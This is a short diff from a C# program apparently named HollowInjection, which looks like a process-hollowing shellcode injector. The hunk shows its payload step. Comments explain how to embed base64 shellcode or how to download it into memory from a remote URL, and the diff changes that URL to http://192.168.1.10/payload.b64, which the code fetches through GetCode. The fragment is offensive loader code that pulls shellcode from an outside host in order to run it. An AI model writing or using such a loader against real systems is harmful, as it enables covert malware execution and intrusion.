@@ -403,8 +403,8 @@ namespace HollowInjection
                 // STEP 1: PAYLOAD
                 // Add a base64 encoded shellcode string were the placeholder is
                 // OR hardcode the URL to remotely download the base64 encoded shellcode in memory
-                string shellcode = "";
-                string urlToSC = @"http://10.111.10.5/sharp.b64";
+                string shellcode = "<PLACEHOLDER>";
+                string urlToSC = @"http://192.168.1.10/payload.b64";
 
                 shellcode = GetCode(urlToSC); //if NOT downloading the shellcode, command this line out. 
 
